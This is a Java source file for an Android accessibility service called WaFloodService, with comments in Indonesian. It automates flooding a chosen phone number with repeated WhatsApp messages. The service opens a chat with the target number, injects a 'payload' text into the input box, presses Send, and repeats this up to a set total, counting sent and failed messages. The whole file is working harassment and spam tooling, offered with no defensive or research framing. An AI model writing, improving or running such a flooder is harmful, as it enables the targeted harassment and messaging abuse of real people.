package com.xnullcat.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class WaFloodService extends AccessibilityService {

    // ── shared state antara app dan service
    public static WaFloodService instance     = null;
    public static boolean        floodActive  = false;
    public static String         floodPhone   = null;
    public static String         floodPayload = null;
    public static int            floodTotal   = 50;
    public static int            floodSent    = 0;
    public static int            floodFail    = 0;
    public static Runnable       onTick       = null;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean waitingForWa  = false;
    private int     waveIndex     = 0;

    @Override
    public void onServiceConnected() {
        instance = this;
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                        | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType    = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags           = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                             | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        info.packageNames    = new String[]{"com.whatsapp", "com.whatsapp.w4b"};
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!floodActive || !waitingForWa) return;

        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (!pkg.equals("com.whatsapp") && !pkg.equals("com.whatsapp.w4b")) return;

        // WA sudah terbuka — coba input + send
        handler.postDelayed(this::doSendPayload, 800);
    }

    private void doSendPayload() {
        if (!floodActive) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) { floodFail++; nextWave(); return; }

        // Cari input box WA — by resource id atau class
        AccessibilityNodeInfo inputBox = findInputBox(root);
        if (inputBox == null) { floodFail++; root.recycle(); nextWave(); return; }

        // Isi teks payload
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, floodPayload);
        inputBox.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);

        // Tunggu sebentar lalu tap Send
        handler.postDelayed(() -> {
            AccessibilityNodeInfo root2 = getRootInActiveWindow();
            if (root2 == null) { floodFail++; nextWave(); return; }

            AccessibilityNodeInfo sendBtn = findSendButton(root2);
            if (sendBtn != null) {
                sendBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                floodSent++;
            } else {
                floodFail++;
            }
            root2.recycle();

            if (onTick != null) handler.post(onTick);
            nextWave();
        }, 600);

        root.recycle();
    }

    private void nextWave() {
        waveIndex++;
        if (!floodActive || waveIndex >= floodTotal) {
            floodActive   = false;
            waitingForWa  = false;
            if (onTick != null) handler.post(onTick);
            // Balik ke app
            handler.postDelayed(() -> {
                Intent back = getPackageManager().getLaunchIntentForPackage(getPackageName());
                if (back != null) {
                    back.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                    startActivity(back);
                }
            }, 500);
            return;
        }

        // Delay antar wave lalu buka WA lagi
        handler.postDelayed(this::openWaChat, 400);
    }

    public void startFlood(String phone, String payload, int total) {
        floodPhone   = phone;
        floodPayload = payload;
        floodTotal   = total;
        floodSent    = 0;
        floodFail    = 0;
        floodActive  = true;
        waveIndex    = 0;
        waitingForWa = false;
        openWaChat();
    }

    public void stopFlood() {
        floodActive  = false;
        waitingForWa = false;
    }

    private void openWaChat() {
        if (!floodActive) return;
        waitingForWa = true;

        // Buka WA chat ke nomor target via intent
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW,
                android.net.Uri.parse("https://api.whatsapp.com/send?phone=" + floodPhone));
            intent.setPackage("com.whatsapp");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
        } catch (Exception e) {
            // WA tidak ada, coba WA Business
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW,
                    android.net.Uri.parse("https://api.whatsapp.com/send?phone=" + floodPhone));
                intent.setPackage("com.whatsapp.w4b");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception ex) {
                floodFail += (floodTotal - waveIndex);
                floodActive = false;
                if (onTick != null) handler.post(onTick);
            }
        }
    }

    // ── helper: cari input box WA
    private AccessibilityNodeInfo findInputBox(AccessibilityNodeInfo root) {
        // Resource IDs WA untuk input chat
        String[] ids = {
            "com.whatsapp:id/entry",
            "com.whatsapp.w4b:id/entry",
            "com.whatsapp:id/conversation_entry",
        };
        for (String id : ids) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) return nodes.get(0);
        }
        // Fallback: cari EditText yang bisa diedit
        return findEditText(root);
    }

    private AccessibilityNodeInfo findEditText(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if ("android.widget.EditText".equals(node.getClassName()) && node.isEditable()) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo found = findEditText(child);
            if (found != null) return found;
        }
        return null;
    }

    // ── helper: cari tombol Send WA
    private AccessibilityNodeInfo findSendButton(AccessibilityNodeInfo root) {
        String[] ids = {
            "com.whatsapp:id/send",
            "com.whatsapp.w4b:id/send",
            "com.whatsapp:id/conversation_entry_action_button",
        };
        for (String id : ids) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) return nodes.get(0);
        }
        // Fallback: cari ImageButton yang clickable
        return findSendBtn(root);
    }

    private AccessibilityNodeInfo findSendBtn(AccessibilityNodeInfo node) {
        if (node == null) return null;
        String cls = node.getClassName() != null ? node.getClassName().toString() : "";
        if ((cls.contains("ImageButton") || cls.contains("Button")) && node.isClickable()) {
            // Tombol send biasanya ada di kanan bawah — ambil yang terakhir ditemukan
        }
        for (int i = node.getChildCount() - 1; i >= 0; i--) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo found = findSendBtn(child);
            if (found != null) return found;
        }
        if ((cls.contains("ImageButton") || cls.contains("Button")) && node.isClickable()) {
            return node;
        }
        return null;
    }

    @Override
    public void onInterrupt() {
        floodActive = false;
    }

    @Override
    public void onDestroy() {
        instance    = null;
        floodActive = false;
        super.onDestroy();
    }
}
